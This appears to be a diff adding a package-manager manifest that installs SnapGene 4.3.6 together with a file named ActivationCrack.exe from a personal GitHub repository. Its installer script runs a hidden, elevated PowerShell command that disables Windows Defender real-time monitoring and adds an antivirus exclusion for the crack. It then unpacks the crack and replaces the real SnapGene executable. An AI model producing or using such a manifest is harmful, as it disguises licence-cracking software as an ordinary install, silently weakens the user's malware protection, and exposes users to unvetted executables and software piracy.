@@ -1,0 +1,41 @@
+{
+	"version": "4.3.6",
+	"description": "A biology software",
+	"homepage": "https://github.com/chenguang217/bucketFiles",
+	"url": [
+		"https://github.com/chenguang217/bucketFiles/releases/download/1.0/snapgene.exe#dl.7z",
+		"https://github.com/chenguang217/bucketFiles/releases/download/1.0/ActivationCrack.exe",
+		"https://github.com/chenguang217/bucketFiles/releases/download/1.0/SnapGene2.exe"
+	],
+	"hash": [
+		"4a7712693d90392290ab83558ed9854d1ed60fc331b24d97bebc890eac61f1c6",
+		"1fe5e27056796afb72e5454a21a6d29692ceef10218fcd09685daef18db89262",
+		"ed9a577fd22c83d90de2dbcebc02469ef0358a6a99252c34af903b7ccb052986"
+	],
+	"installer": {
+		"script": [
+			"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 1;Add-MpPreference -ExclusionPath $dir\\ActivationCrack.exe;Set-MpPreference -DisableRealtimeMonitoring 0\" -Verb RunAs -WindowStyle hidden -wait",
+			"mv $dir\\ActivationCrack.exe $dir\\ActivationCrack2.rar",
+			"7z x $dir\\ActivationCrack2.rar \"-o$dir\"",
+			"rm $dir\\ActivationCrack2.rar",
+			"rm $dir\\SnapGene.exe",
+			"mv $dir\\SnapGene2.exe $dir\\SnapGene.exe"
+		]
+	},
+	"notes": "run snapgene activation for registration",
+	"shortcuts": [
+		[
+			"ActivationCrack.exe",
+			"ActivationCrack"
+		],
+		[
+			"SnapGene.exe",
+			"SnapGene"
+		]
+	],
+	"uninstaller": {
+		"script": [
+			"Start-Process powershell \"Remove-MpPreference -ExclusionPath $dir\\ActivationCrack.exe\" -Verb RunAs -WindowStyle hidden"
+		]
+	}
+}
